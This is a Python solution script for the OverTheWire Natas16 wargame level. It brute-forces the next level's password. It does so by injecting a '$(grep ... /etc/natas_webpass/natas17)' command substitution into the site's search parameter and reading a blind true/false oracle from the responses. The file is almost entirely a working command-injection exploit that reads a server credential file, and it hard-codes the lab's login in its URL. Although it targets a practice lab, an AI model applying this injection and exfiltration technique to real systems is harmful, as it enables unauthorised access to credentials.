#!/usr/bin/python

# Brute force script for Natas16
#
# It uses command substitution with grep in order to brute force 
# the password. 
#
# The payoad looks like this :
#   $(grep -E ^{}.* /etc/natas_webpass/natas17)hacked
#
# If the substituted grep finds a good letter, it will output the
# letter or the entire sentence where the letter was found modifying
# the initial grep to '<output>hacked' (e.g. 'Qhacked') which will 
# not be found in the dictionary.txt. 
#
# If the substitution grep does not find a good letter, it will output
# nothing, therefore the initial grep will just search for 'hacked'
# which exists in dictionary.txt, therefore the initial grep will
# return at least one work containig hacked. 
#
# Hence, if we find 'hacked' in the response, we know that the letter
# is not good, and we skip it. And when there is no 'hacked' in the
# response, we found a good letter !

import sys, os 
sys.path.append(os.path.join(os.path.dirname(__file__), ".."))  

from lib.utils import write, check_pass

import string
import requests

natas_url = ("http://natas16:WaIHEacj63wnNIBROHeqi3p9t0m5nhmh"
             "@natas16.natas.labs.overthewire.org?"
             "needle=$(grep -E ^{}.* /etc/natas_webpass/natas17)hacked"
             "&submit=Search")

def get_letters():
    letters = string.ascii_letters + string.digits
    write("Trying all letters : " + letters)

    return letters

def crack_key(letters):
    password = ""
    password_len = 32

    write("\nCracking password : " + password_len * "_" + password_len * "\b")
    while(len(password) != password_len):
        for letter in letters:
            response = requests.get(natas_url.format(password + letter))
            if "hacked" not in response.content:
                password += letter
                write(letter)

    return password

def crack_it():
    letters = get_letters()
    key = crack_key(letters)
    write(check_pass("natas17.natas.labs.overthewire.org", "natas17", key))

if __name__ == "__main__":
    crack_it()
